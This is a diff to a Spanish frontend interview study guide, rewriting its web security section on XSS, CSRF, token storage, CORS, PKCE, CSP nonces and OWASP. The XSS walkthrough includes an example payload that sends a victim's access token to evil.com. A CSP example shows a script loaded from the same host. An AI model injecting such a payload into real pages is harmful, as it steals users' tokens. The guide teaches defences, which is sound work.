@@ -4044,141 +4044,290 @@ usarla; i18n = que funcione bien en cualquier idioma/cultura.
 
 ## 10. Seguridad en frontend
 
-Esto amplía la sección 4 de `GOOD-FRONTEND-PRACTICES.md` con temas de nivel
-senior que no se cubrieron ahí:
+**Seguridad en frontend** no significa “proteger el código del
+navegador” (eso es imposible: cualquiera puede ver, modificar o
+reenviar lo que corre en el cliente). Significa **reducir la superficie
+de ataque** en el navegador y **nunca tratar la UI como autorización**.
+La regla base: el backend valida permisos, autenticación y datos; el
+frontend ayuda con UX, cookies bien configuradas, escape de HTML,
+headers de defensa (**CSP**, *Content Security Policy*) y no filtrar
+secretos en el bundle.
+
+### Básico
+
+- El cliente no es de confianza: UI ≠ autorización
+
+  - **Teoría**: ocultar un botón, deshabilitar un menú o no renderizar
+    una ruta en React es **UX**, no seguridad. Un atacante abre DevTools,
+    Postman o escribe un `fetch` a mano y llama al endpoint igual. Quien
+    debe rechazar la acción es el servidor (rol, ownership, scopes).
+  - **Ejemplo**:
+    ```tsx
+    // Correcto como UX: el admin ve el botón; el resto no
+    {usuario.rol === 'admin' && (
+      <button onClick={eliminarUsuario}>Eliminar</button>
+    )}
+    ```
+    Si `DELETE /users/:id` no revalida el rol en el servidor, cualquier
+    usuario autenticado puede borrarlo sin pasar por ese botón.
+
+- XSS (*Cross-Site Scripting*): inyectar JS en tu página
+
+  - **Teoría**: **XSS** ocurre cuando tu app toma texto que alguien más
+    controló (un comentario, un nombre de usuario, un parámetro de la
+    URL) y lo mete en la página de forma que el **navegador lo trata como
+    código**, no como texto plano. Ejemplo: si un atacante escribe
+    `<script>…</script>` o `<img onerror="…">` en un comentario y la app
+    lo inserta “tal cual” en el HTML, el navegador **ejecuta** ese
+    script en el contexto de tu sitio (con las cookies/tokens de quien
+    abre la página). Con eso pueden leer `localStorage`, cambiar la UI o
+    enviar datos a otro servidor. “Controlado por un atacante” = cualquier
+    dato que no escribió tu propio backend de forma fija: inputs de
+    usuario, contenido de terceros, query strings, etc.
+
+  - **Ejemplo de cómo se ve un XSS en tu página** (flujo completo):
+    1. Tienes un muro de comentarios. El backend guarda lo que el usuario
+       escribe y luego lo muestra a todo el mundo.
+    2. Un atacante publica este “comentario” (no es texto inocente; es
+       HTML/JS disfrazado):
+       ```html
+       <img src="x" onerror="
+         fetch('https://evil.com/robar?t=' + localStorage.getItem('access_token'))
+       ">
+       ```
+       (`onerror` = “cuando falle la carga de la imagen, ejecuta este JS”.
+       La imagen `src="x"` falla a propósito.)
+    3. Tu frontend pinta mal el comentario, sin escapar, p. ej.:
+       ```js
+       // Antipatrón (vanilla o saltándose React)
+       document.getElementById('lista').innerHTML = comentario.texto;
+       ```
+       o en React con `dangerouslySetInnerHTML` y el string crudo.
+    4. Cuando **otra persona** (o tú) abre la página, el navegador inserta
+       esa `<img>`, falla la carga y **corre el JS del atacante dentro de
+       miapp.com**. No hace falta que la víctima haga clic en nada
+       sospechoso: solo ver el comentario ya dispara el robo del token si
+       estaba en `localStorage`.
+    5. Si en cambio pintas con texto escapado (`<p>{comentario.texto}</p>`
+       en React), el usuario **ve** el código en pantalla como caracteres
+       literales y **no se ejecuta** nada.
+
+  - **Soluciones (generales, sin framework)**:
+    1. **Tratar el dato como texto, no como HTML**: al pintar, convertir
+       caracteres especiales (`<`, `>`, `&`, `"`) a entidades (`&lt;`,
+       `&gt;`, …) para que el navegador **muestre** `<script>` en pantalla
+       en vez de **interpretarlo** como etiqueta. Eso se llama
+       **escapar** (*escape*).
+    2. **Si de verdad necesitas HTML** (markdown, editor enriquecido):
+       **sanitizar** primero — quitar/bloquear tags y atributos peligrosos
+       (`script`, `onerror`, `javascript:`) con una librería pensada para
+       eso (p. ej. DOMPurify), no con regex caseras.
+    3. **No asignar HTML crudo** a propiedades del DOM como `innerHTML`
+       con datos no confiables.
+    4. **Reforzar con CSP** (*Content Security Policy*): aunque falle el
+       escape, el navegador puede bloquear scripts inyectados (ver
+       epígrafe de CSP más abajo).
+
+  - **Soluciones en React**:
+    1. **Texto en JSX (`{variable}`)**: React **escapa** por defecto.
+       “Escapa el texto” significa: si `comentario.texto` vale
+       `<script>alert(1)</script>`, React no lo mete como etiqueta
+       `<script>` en el DOM; lo convierte a texto seguro, y el usuario
+       **ve** los caracteres `<script>…</script>` en la página, pero el
+       navegador **no ejecuta** ese script. Por eso
+       `<p>{comentario.texto}</p>` es el camino seguro habitual.
+    2. **`dangerouslySetInnerHTML`**: desactiva ese escape a propósito
+       (“dangerous” = tú asumes el riesgo). React inserta el string como
+       HTML real. Solo úsalo con HTML que **tú** generaste o que ya
+       sanitizaste; nunca con el string crudo del usuario.
+    3. Evita APIs del DOM crudo (`element.innerHTML = …`) dentro de
+       efectos/refs con datos no confiables: saltan las protecciones de
+       React.
+
+  - **Ejemplo (código seguro vs peligroso en React)**:
+    ```tsx
+    // Seguro: React escapa — el navegador muestra el texto, no ejecuta JS
+    <p>{comentario.texto}</p>
+
+    // Peligroso: React NO escapa; interpreta el string como HTML
+    // (aquí es donde el payload del atacante del ejemplo de arriba sí corre)
+    <div dangerouslySetInnerHTML={{ __html: comentario.texto }} />
+
+    // Si necesitas HTML: sanitiza antes
+    // <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+    ```
+
+- CSRF (*Cross-Site Request Forgery*): otra web fuerza tu petición
+
+  - **Teoría**: **CSRF** aprovecha que el navegador **envía cookies
+    automáticamente** al dominio de la API. Un sitio malicioso puede
+    disparar un `POST` a tu backend mientras la víctima está logueada.
+    Mitigación moderna: cookies con `SameSite=Strict` o `Lax` (el
+    navegador no las manda en contextos cross-site problemáticos), más
+    tokens CSRF o preferir auth por header (`Authorization: Bearer …`)
+    en vez de cookie de sesión para APIs de SPA cuando el diseño lo
+    permite.
+  - **Ejemplo**:
+    ```
+    Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
+    ```
+    `HttpOnly` = JS no puede leer la cookie (mitiga robo vía XSS).
+    `Secure` = solo viaja por HTTPS. `SameSite=Strict` = no se envía
+    en peticiones originadas desde otro sitio.
+
+- Dónde guardar tokens y datos sensibles
+
+  - **Teoría**: `localStorage` / `sessionStorage` son legibles desde
+    cualquier JS de la página: un XSS los vacía. El **access token**
+    (corto, a menudo un **JWT**) debería vivir **en memoria**; el
+    **refresh token** (larga vida) en cookie `HttpOnly` + `Secure` +
+    `SameSite`. Nunca pongas secretos de servidor, API keys privadas ni
+    passwords en el bundle del frontend (todo es público). No pongas
+    tokens en la URL (quedan en historial, logs y `Referer`).
+  - **Ejemplo**:
+    ```ts
+    // Mal: cualquier XSS puede hacer localStorage.getItem('token')
+    localStorage.setItem('access_token', token);
+
+    // Mejor: solo en memoria del proceso JS
+    let accessToken: string | null = token;
+    ```
+
+- CORS: qué protege y qué no
+
+  - **Teoría**: **CORS** (*Cross-Origin Resource Sharing*, ya visto en
+    la sección 1) limita que un script de **otro origen** pueda *leer*
+    la respuesta en el navegador. No autentica usuarios, no sustituye
+    permisos en el backend y no impide que alguien llame a tu API desde
+    curl/Postman. Un CORS “abierto” (`Access-Control-Allow-Origin: *`
+    con credenciales mal configuradas) es un *misconfiguration*; uno
+    bien acotado es higiene, no el muro principal.
+  - **Ejemplo**: el error `blocked by CORS policy` lo aplica el
+    **navegador** al frontend; el servidor solo declara qué orígenes
+    puede leer la respuesta. La API sigue siendo alcanzable fuera del
+    navegador.
+
+- Dependencias, secretos en el bundle y clickjacking
+
+  - **Teoría**: librerías desactualizadas con **CVE** (*Common
+    Vulnerabilities and Exposures* — identificador público de un fallo
+    conocido) son un riesgo real en frontend (XSS en un markdown
+    renderer, prototype pollution, etc.). Revisa con `npm audit` /
+    Dependabot y actualiza. El *clickjacking* mete tu app en un iframe
+    transparente para engañar clics; se mitiga con
+    `Content-Security-Policy: frame-ancestors 'none'` (o
+    `X-Frame-Options: DENY`).
+  - **Ejemplo**:
+    ```
+    Content-Security-Policy: frame-ancestors 'none'
+    ```
 
 ### En profundidad
-
-- Mapeo del OWASP Top 10 a riesgos específicos de frontend
-
-  - **Teoría**: **OWASP** (*Open Web Application Security Project* — ver
-    Glosario) publica el Top 10 de riesgos de seguridad web más comunes;
-    no todos aplican igual al frontend, pero varios sí tienen una cara
-    específica del lado del cliente que vale la pena reconocer por
-    nombre en una entrevista: *Broken Access Control* (el frontend oculta
-    un botón, pero si el backend no revalida el permiso, el usuario
-    puede llamar el endpoint directamente); *Injection* (XSS, ya visto en
-    `GOOD-FRONTEND-PRACTICES.md`, es la variante de inyección más
-    relevante en frontend); *Identification and Authentication Failures*
-    (tokens mal gestionados, sesiones que no expiran); *Security
-    Misconfiguration* (CSP ausente o demasiado permisiva, CORS mal
-    configurado); *Vulnerable and Outdated Components* (dependencias con
-    CVEs conocidos, ya visto también en la sección de seguridad
-    existente).
-  - **Ejemplo**: el caso de *Broken Access Control* es el que más
-    sorprende a quien viene de pensar la seguridad solo desde la UI:
-    ```tsx
-    // Ocultar el botón NO es seguridad, es solo UX -- el backend es quien
-    // debe rechazar la petición si el usuario no tiene el rol correcto
-    {usuario.rol === 'admin' && <button onClick={eliminarUsuario}>Eliminar</button>}
-    ```
-    Si el endpoint `DELETE /users/:id` no revalida el rol en el servidor,
-    cualquier usuario autenticado puede llamarlo directamente desde la
-    consola del navegador o Postman, sin pasar nunca por ese botón.
 
 - Flujo OAuth 2.0 + OIDC con PKCE, paso a paso
 
   - **Teoría**: **OAuth 2.0** es un protocolo de **autorización**
     (delega acceso a un recurso sin compartir la contraseña); **OIDC**
     (*OpenID Connect* — ver Glosario) se construye encima para añadir
-    **autenticación** (identificar quién es el usuario, no solo qué
-    puede hacer). Un backend tradicional puede guardar un *client
-    secret* de forma segura para completar el intercambio de código por
-    token, pero una SPA no tiene dónde esconder un secreto (todo su
-    código es visible en el navegador) — es un *cliente público*. **PKCE**
-    (*Proof Key for Code Exchange* — ver Glosario) resuelve esto sin
-    necesitar un secreto fijo: la propia app genera un secreto
-    **temporal y de un solo uso** en cada login, así que aunque alguien
-    intercepte el código de autorización a mitad de camino, no puede
-    canjearlo por un token sin ese secreto efímero que solo la app
-    original generó.
+    **autenticación** (quién es el usuario, no solo qué puede hacer).
+    Un backend puede guardar un *client secret*; una **SPA** (*Single
+    Page Application*) no — todo el código es visible: es un *cliente
+    público*. **PKCE** (*Proof Key for Code Exchange*) resuelve eso sin
+    secreto fijo: la app genera un secreto **temporal de un solo uso**
+    por login; si alguien intercepta el código de autorización, no puede
+    canjearlo sin ese secreto efímero.
   - **Ejemplo paso a paso**:
     1. La SPA genera un `code_verifier` aleatorio y su hash SHA-256, el
        `code_challenge`.
     2. Redirige al usuario al proveedor de identidad con el
-       `code_challenge` (no el verifier — ese nunca sale del navegador
-       todavía):
+       `code_challenge` (el verifier aún no sale del navegador):
        ```
        GET https://auth.miapp.com/authorize
          ?client_id=abc123&response_type=code
          &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
          &code_challenge_method=S256
        ```
-    3. El usuario se autentica en el proveedor y es redirigido de vuelta
-       con un `code` de un solo uso.
-    4. La SPA canjea ese `code` **junto con el `code_verifier` original**
-       (guardado localmente desde el paso 1) por un token:
+    3. El usuario se autentica y vuelve con un `code` de un solo uso.
+    4. La SPA canjea ese `code` **junto con el `code_verifier` original**:
        ```ts
        fetch('https://auth.miapp.com/token', {
          method: 'POST',
-         body: new URLSearchParams({ grant_type: 'authorization_code', code, code_verifier }),
+         body: new URLSearchParams({
+           grant_type: 'authorization_code',
+           code,
+           code_verifier,
+         }),
        });
        ```
-    5. El servidor de autorización recalcula el hash de `code_verifier` y
-       lo compara contra el `code_challenge` del paso 2 — si alguien
-       robó el `code` en el paso 3 pero no tiene el `code_verifier`
-       original (que nunca viajó por la URL), el intercambio falla.
+    5. El servidor recalcula el hash del `code_verifier` y lo compara
+       con el `code_challenge` del paso 2. Sin el verifier original
+       (que nunca viajó en la URL), el intercambio falla.
 
 - Access token vs refresh token: dónde debe vivir cada uno
 
-  - **Teoría**: el **access token** (normalmente un **JWT**, *JSON Web
-    Token*) es de corta duración (minutos) y se envía en cada petición
-    a la API — si se filtra, la ventana de daño es corta. El **refresh
-    token** vive mucho más tiempo y sirve solo para pedir un access token
-    nuevo sin obligar al usuario a volver a iniciar sesión — si este se
-    filtra, el daño es mucho mayor (acceso indefinido). Por eso el
-    refresh token debe protegerse con el máximo cuidado: una cookie
-    `HttpOnly` (inaccesible desde JS, ya visto en la sección de
-    seguridad existente) es preferible a guardarlo en memoria o
-    `localStorage`, donde cualquier XSS podría robarlo directamente.
+  - **Teoría**: el **access token** (suele ser un **JWT**, *JSON Web
+    Token*) dura poco (minutos) y va en cada petición a la API — si se
+    filtra, la ventana de daño es corta. El **refresh token** dura mucho
+    y solo sirve para pedir un access token nuevo; si se filtra, el daño
+    es mayor. Por eso el refresh token va en cookie `HttpOnly` (JS no lo
+    ve); el access token, en memoria, nunca en `localStorage`.
   - **Ejemplo**:
     ```
-    # El backend setea el refresh token como cookie HttpOnly -- el JS del
-    # frontend nunca lo toca ni lo ve
+    # El backend setea el refresh; el JS del frontend nunca lo toca
     Set-Cookie: refresh_token=eyJ...; HttpOnly; Secure; SameSite=Strict
     ```
     ```ts
-    // El access token sí lo maneja el frontend, pero solo en memoria
-    // (nunca en localStorage) y con vida corta
     let accessToken: string | null = null;
 
     async function renovarAccessToken() {
-      // La cookie HttpOnly viaja sola, automáticamente, con credentials: 'include'
+      // La cookie HttpOnly viaja sola con credentials: 'include'
       const res = await fetch('/auth/refresh', { credentials: 'include' });
       const { accessToken: nuevo } = await res.json();
-      accessToken = nuevo; // solo vive en memoria del proceso de JS
+      accessToken = nuevo; // solo en memoria
     }
     ```
 
-- Content Security Policy avanzada con nonces y `strict-dynamic`
+- CSP avanzada con nonces y `strict-dynamic`
 
-  - **Teoría**: la CSP básica ya vista en `GOOD-FRONTEND-PRACTICES.md`
-    (`script-src 'self'`) es rígida y difícil de mantener con scripts
-    inyectados dinámicamente (analytics, A/B testing) — cada nuevo
-    dominio de terceros obliga a editar la política. Una **nonce**
-    (número usado una sola vez) generada por el servidor en cada
-    petición, y puesta tanto en el header CSP como en el atributo
-    `nonce` del `<script>`, autoriza scripts específicos sin necesitar
-    listar dominios. `'strict-dynamic'` extiende esa confianza:
-    un script ya autorizado por nonce puede a su vez cargar otros
-    scripts dinámicamente (`document.createElement('script')`), sin que
-    cada uno necesite su propia nonce — resolviendo el caso común de
-    librerías de analytics que cargan sub-scripts propios.
+  - **Teoría**: una **CSP** básica (`script-src 'self'`) bloquea scripts
+    de otros orígenes, pero se vuelve rígida con analytics o A/B testing
+    (cada dominio nuevo obliga a editar la política). Una **nonce**
+    (número de un solo uso) la genera el servidor en cada respuesta y la
+    pone en el header CSP y en el atributo `nonce` del `<script>`: solo
+    esos scripts corren. `'strict-dynamic'` extiende esa confianza: un
+    script ya autorizado puede cargar otros con
+    `document.createElement('script')` sin listar dominios (caso típico
+    de analytics que cargan sub-scripts).
   - **Ejemplo**:
     ```
     Content-Security-Policy: script-src 'self' 'nonce-r4nd0mAB12' 'strict-dynamic'
     ```
     ```html
-    <!-- Solo este script (con la nonce exacta del header) se ejecuta -->
     <script nonce="r4nd0mAB12" src="/analytics.js"></script>
 
-    <!-- Un <script> inyectado sin esa nonce es bloqueado por el navegador,
-         aunque un atacante lograra inyectarlo vía XSS -->
+    <!-- Sin la nonce exacta, el navegador lo bloquea aunque haya XSS -->
     <script src="https://evil.com/malware.js"></script>
     ```
-    La nonce debe generarse **de nuevo en cada respuesta del servidor**
-    (nunca reutilizarse): si fuera fija, un atacante que la descubra una
-    vez podría reutilizarla para autorizar su propio script inyectado.
+    La nonce debe regenerarse **en cada respuesta**; si es fija, quien la
+    descubra puede reutilizarla para autorizar su script.
+
+- OWASP Top 10: cómo clasifica la industria estos riesgos
+
+  - **Teoría**: **OWASP** (*Open Web Application Security Project*) es
+    una organización que publica el **Top 10** de riesgos de seguridad
+    web más comunes. No es una checklist “solo de frontend”: es el
+    vocabulario estándar de la industria (entrevistas, auditorías,
+    priorización). Varias entradas tienen cara clara de cliente:
+    *Broken Access Control* (UI oculta ≠ permiso real); *Injection*
+    (en frontend, sobre todo XSS); *Identification and Authentication
+    Failures* (tokens mal guardados, sesiones que no expiran);
+    *Security Misconfiguration* (CSP ausente/débil, CORS mal planteado);
+    *Vulnerable and Outdated Components* (dependencias con CVE).
+  - **Ejemplo**: en una entrevista, en vez de “tenemos seguridad”,
+    puedes mapear: “el riesgo de ocultar el botón de admin es Broken
+    Access Control — lo mitigamos validando rol en API; XSS lo
+    contenemos con escape + CSP; los tokens siguen el patrón access en
+    memoria / refresh HttpOnly”.
 
 ## 11. Testing y calidad
 
@@ -5331,8 +5480,21 @@ Definiciones de las siglas usadas en la sección 10 (Seguridad en
 frontend):
 
 - **OWASP (Open Web Application Security Project)**: organización que
-  publica el "Top 10" de riesgos de seguridad web más comunes, una
-  referencia estándar de la industria para clasificar vulnerabilidades.
+  publica el "Top 10" de riesgos de seguridad web más comunes; sirve
+  como vocabulario y checklist de la industria (no es una norma solo de
+  frontend).
+- **XSS (Cross-Site Scripting)**: inyección de JavaScript malicioso en
+  páginas que otros usuarios ven o ejecutan; en frontend es la forma más
+  relevante de *Injection*.
+- **CSRF (Cross-Site Request Forgery)**: ataque que aprovecha cookies
+  enviadas automáticamente para que el navegador de un usuario
+  autenticado mande una petición no deseada a tu API.
+- **CSP (Content Security Policy)**: header HTTP que dice al navegador
+  qué scripts, estilos e iframes puede cargar/ejecutar; mitiga XSS y
+  clickjacking (`frame-ancestors`).
+- **CVE (Common Vulnerabilities and Exposures)**: identificador público
+  estandarizado de una vulnerabilidad conocida (p. ej. en una
+  dependencia de npm).
 - **OAuth (Open Authorization)**: protocolo de autorización que permite a
   una aplicación acceder a un recurso en nombre de un usuario sin que
   este comparta su contraseña directamente con ella.
@@ -5348,8 +5510,8 @@ frontend):
   token en flujos OAuth/OIDC.
 - **UX (User Experience / experiencia de usuario)**: la calidad de la
   experiencia percibida por quien usa el producto (facilidad, claridad,
-  fricción); se usa para distinguir un riesgo puramente de negocio o de
-  percepción de un riesgo técnico o de seguridad real.
+  fricción); se usa para distinguir un control de UI (ocultar un botón)
+  de una garantía real de seguridad (validar en el servidor).
 - **SHA (Secure Hash Algorithm)**: familia de funciones hash
   criptográficas (por ejemplo, SHA-256) que producen una huella digital
   de longitud fija a partir de cualquier dato; en PKCE se usa para
